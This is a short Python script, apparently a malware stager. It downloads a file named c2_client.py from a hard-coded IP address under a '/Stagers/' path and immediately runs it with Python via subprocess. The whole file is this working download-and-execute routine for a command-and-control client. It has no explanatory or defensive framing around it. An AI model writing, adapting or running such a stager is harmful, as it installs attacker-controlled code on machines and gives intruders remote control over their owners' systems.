import urllib.request
import os
import subprocess

# URL to download the c2_client.py payload
PAYLOAD_URL = 'http://13.41.65.77:80/Stagers/c2_client.py'  # Ensure this is correct
PAYLOAD_FILENAME = 'c2_client.py'

def download_payload(url, filename):
    try:
        print("[*] Downloading payload...")
        urllib.request.urlretrieve(url, filename)
        print(f"[*] Payload downloaded as {filename}")
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e}")
    except Exception as e:
        print(f"[!] Failed to download payload: {e}")

def execute_payload(filename):
    try:
        if os.path.isfile(filename):
            print("[*] Executing payload...")
            subprocess.Popen(['python', filename])
            print(f"[*] Executing payload: {filename}")
        else:
            print(f"[!] Payload file does not exist: {filename}")
    except Exception as e:
        print(f"[!] Failed to execute payload: {e}")

if __name__ == "__main__":
    download_payload(PAYLOAD_URL, PAYLOAD_FILENAME)
    execute_payload(PAYLOAD_FILENAME)
